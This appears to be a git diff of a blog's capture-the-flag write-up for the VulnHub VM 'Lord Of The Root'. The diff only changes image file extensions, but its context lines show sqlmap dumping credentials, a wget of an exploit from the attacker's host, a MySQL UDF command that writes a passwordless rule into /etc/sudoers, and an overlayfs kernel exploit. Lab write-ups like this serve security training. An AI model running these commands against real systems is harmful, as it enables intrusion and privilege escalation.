@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Lord Of The Root: 1.0.1](https://www.vulnhub.com/entry/lord-of-the-root-101,129/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_lordoftheroot101/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_lordoftheroot101/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -61,11 +61,11 @@ knock 192.168.92.151 1,2,3
   1337/tcp open  waste
 ```
 
-![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png)  
+![writeup.enumeration.steps.2.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot01.png.webp)  
 
-![writeup.enumeration.steps.2.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png)  
+![writeup.enumeration.steps.2.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot02.png.webp)  
 
-![writeup.enumeration.steps.2.3](/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png)  
+![writeup.enumeration.steps.2.3](/static/files/posts_vulnhub_lordoftheroot101/screenshot03.png.webp)  
 
 3\. We see that the newly opened port is running a HTTP service. We explore it using a web browser. We find a Base64 encoded text within HTML source of the `robots.txt` page. Upon decoding it twice we find a directory path which leads to a login form:  
 ```
@@ -79,11 +79,11 @@ b64d Lzk3ODM0NTIxMC9pbmRleC5waHA=
   /978345210/index.php
 ```
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot04.png.webp)  
 
-![writeup.enumeration.steps.3.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png)  
+![writeup.enumeration.steps.3.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot05.png.webp)  
 
-![writeup.enumeration.steps.3.3](/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png)  
+![writeup.enumeration.steps.3.3](/static/files/posts_vulnhub_lordoftheroot101/screenshot06.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -108,18 +108,18 @@ webapp: frodo, smeagol, aragorn, legolas, gimli
 sqlmap -u "http://192.168.92.151:1337/978345210/index.php" --batch --forms --dump
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot07.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot08.png.webp)  
 
 2\. We check if any of these users have a local account on the target system and if they have reused their web application credentials for system login as well. We find that user `smeagol` has an account on the target system and has reused their password. This gives us a local interactive SSH access on the target system:  
 ```
 ssh smeagol@192.168.92.151
 ```
 
-![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png)  
+![writeup.exploitation.steps.2.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot09.png.webp)  
 
-![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png)  
+![writeup.exploitation.steps.2.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot10.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -152,7 +152,7 @@ cd /var/www
 grep -nir mysql ./
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot11.png.webp)  
 
 2\. We find that `mysql` is running with elevated privileges. This opens the possibility of running the UDF exploit and as such we look for `lib_mysqludf_sys.so` file on the target system. This file is not found so we have to use an exploit to create one and use it from `mysql` shell (using credentials found in previous step):  
 ```
@@ -162,7 +162,7 @@ cd /tmp
 wget http://192.168.92.183:9999/1518.c
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot12.png.webp)  
 
 3\. We follow the steps mentioned within the exploit to compile and create the shared object file. We then connect to the `mysql` shell, load the shared object and map it to a custom function called `do_system`. This function can now be used to execute commands from within `mysql` shell with elevated privileges. We run a command to give all permissions to user `smeagol`:  
 ```
@@ -180,20 +180,20 @@ mysql -u localhost -u root -p
   select do_system('echo "smeagol ALL =(ALL) NOPASSWD: ALL" >> /etc/sudoers');
 ```
 
-![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png)  
+![writeup.privesc.steps.3.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot16.png.webp)  
 
-![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png)  
+![writeup.privesc.steps.3.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot17.png.webp)  
 
-![writeup.privesc.steps.3.3](/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png)  
+![writeup.privesc.steps.3.3](/static/files/posts_vulnhub_lordoftheroot101/screenshot18.png.webp)  
 
-![writeup.privesc.steps.3.4](/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png)  
+![writeup.privesc.steps.3.4](/static/files/posts_vulnhub_lordoftheroot101/screenshot19.png.webp)  
 
 4\. We can now exit from the `mysql` shell, check for user `smeagol`'s `sudo` privileges and switch to user `root`:  
 ```
 sudo -l
 ```
 
-![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png)  
+![writeup.privesc.steps.4.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot20.png.webp)  
 
 5\. Another way to gain elevated privileges is to run the `overlayfs` exploit on the target system because it has a kernel compiled before `2015-12-26`:  
 ```
@@ -203,16 +203,16 @@ gcc -o 39166 39166.c
 ./39166
 ```
 
-![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png)  
+![writeup.privesc.steps.5.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot13.png.webp)  
 
-![writeup.privesc.steps.5.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png)  
+![writeup.privesc.steps.5.2](/static/files/posts_vulnhub_lordoftheroot101/screenshot14.png.webp)  
 
 6\. Once we have elevated privileges, we can view the contents of the `/root/Flag.txt` file to complete the challenge:  
 ```
 cat /root/Flag.txt
 ```
 
-![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png)  
+![writeup.privesc.steps.6.1](/static/files/posts_vulnhub_lordoftheroot101/screenshot15.png.webp)  
 
 ## Loot
 ### Hashes
